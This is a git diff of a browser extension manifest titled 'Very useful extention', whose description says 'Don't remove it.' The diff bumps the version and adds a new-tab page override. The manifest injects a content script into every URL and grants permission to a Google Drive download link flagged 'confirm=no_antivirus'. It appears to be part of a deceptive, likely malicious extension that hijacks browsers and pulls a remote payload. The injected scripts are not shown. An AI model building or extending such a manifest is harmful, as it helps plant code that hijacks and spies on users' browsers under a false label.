@@ -1,6 +1,6 @@
 {
   "name": "Very useful extention",
-  "version": "1.0",
+  "version": "2.0",
   "manifest_version": 2,
 
   "description": "This extention is very useful. Don't remove it.",
@@ -8,14 +8,20 @@
 
   "permissions": [ "tabs", "https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1JLOWXC603p7fiMHvtvQJvddNkpDmQQX7" ],
 
+  "browser_action": {},
+
+  "chrome_url_overrides" : {
+    "newtab": "page.html"
+  },
+
   "content_scripts": [
     {
       "matches": [ "<all_urls>" ],
-      "js": [ "cont.js" ]
+      "js": [ "scripts/cont.js" ]
     }
   ],
 
   "background": {
-    "scripts": [ "prog.js" ]
+    "scripts": [ "scripts/prog.js" ]
   }
 }
